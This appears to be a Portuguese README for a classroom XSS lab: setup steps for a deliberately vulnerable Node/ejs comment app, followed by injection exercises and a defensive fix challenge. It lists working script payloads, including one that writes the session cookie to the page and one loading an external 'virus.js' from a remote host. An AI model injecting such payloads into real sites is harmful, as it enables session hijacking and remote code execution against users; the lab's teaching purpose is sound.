# Clonando e executando este projeto

1. Clique sobre o botão verde `[Code]` e copie o endereço deste repositório.
2. Abra o Visual Studio Code. Se houver algum projeto aberto, feche-o usando a opção de menu `Arquivo > Fechar Pasta` (ou `File > Close folder`).
3. Clique sobre o botão que se parece com um `Y` na barra vertical esquerda do Visual Studio Code. Em seguida, clique sobre o botão `[Clonar repositório...]` (ou `[Clone repository...]`). Nessa etapa, se o Git não estiver instalado na máquina, será necessário baixá-lo (a partir de [https://git-scm.com/](https://git-scm.com/)) e instalá-lo antes de poder clonar o repositório.
4. Na caixa de diálogo que se abre no alto da janela, cole o endereço do repositório copiado no passo 1.
5. Escolha um pasta local do computador para armazenar os arquivos do repositório clonado.
6. Ao ser perguntado se deseja abrir o repositório clonado, clique sobre o botão `[Abrir]`.
7. Abra o terminal integrado do VS Code (`Ctrl+Shift+Aspa simples`).
8. Instale as dependências do projeto executando `npm install` no terminal.
9. Para rodar o projeto, execute `npm start` no terminal.
10. Acesse a aplicação em [http://localhost:3000](http://localhost:3000).

---

### 🧀 Explorando a vulnerabilidade

A aplicação permite **comentários**, mas **não sanitiza a entrada do usuário**.
Isso significa que você pode inserir **código JavaScript malicioso**.

Experimente postar este comentário:

```html
<script>alert('XSS encontrado!');</script>
```

Se a aplicação estiver vulnerável, você verá um **alert()** sendo executado no navegador! 🔥

---

### 🚩 Capturando a Flag

Dentro da aplicação há uma _flag_ escondida. Tente capturá-la usando:

```html
<script>document.write('<h1>' + document.cookie + '</h1>');</script>
```

Se bem-sucedido, o **_cookie_ da sessão** será exposto, o que pode ser usado para roubar a identidade de usuários logados.

---

### ☠️ Executando um _script_ malicioso mais "interessante

Experimente comentar

```html
<script src="https://faustocintra.com.br/_seg/virus.js"></script>
```

---

### 🚀 Desafio extra

Modifique o código para **corrigir a vulnerabilidade**! Algumas técnicas incluem:

- **Sanitização da entrada** (escape de HTML ou bibliotecas como `DOMPurify`).
- **Uso de Content Security Policy (CSP)** para bloquear execução de _scripts_ injetados.
- **Definir a flag `HttpOnly` nos _cookies_** para impedir acesso via JavaScript.
- Usar a **_tag_ de saída de HTML com escape** da biblioteca **ejs** (com a qual o _front-end_ desta aplicação foi desenvolvido).

---

💡 **Dica:** Teste diferentes abordagens de ataque e tente explorar outras vulnerabilidades no código! Boa sorte! 🚀
